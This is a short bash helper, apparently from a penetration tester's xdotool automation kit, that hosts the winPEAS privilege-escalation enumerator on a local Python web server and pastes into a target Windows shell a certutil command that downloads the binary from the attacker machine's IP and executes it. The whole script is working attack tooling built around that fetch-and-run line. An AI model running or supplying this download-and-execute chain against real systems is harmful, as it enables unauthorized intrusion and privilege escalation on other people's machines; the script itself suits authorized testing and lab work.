#!/bin/bash

: '
download winPEASx64_ofs.exe to server and execute
'

# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -O ~/Desktop/base/code/xdotool/scripts/reconnaissance/linux/.files/winPEASx64_ofs.exe

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "PORT"

PORT=${form_data["PORT"]}

cd ~/Desktop/base/code/xdotool/scripts/reconnaissance/windows/cmd/.files
python3 -m http.server ${PORT} &
HTTP_PID=$!

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:${PORT}/winPEASx64_ofs.exe winPEASx64_ofs.exe && .\winPEASx64_ofs.exe"
xdotool key Return
sleep 10

kill $HTTP_PID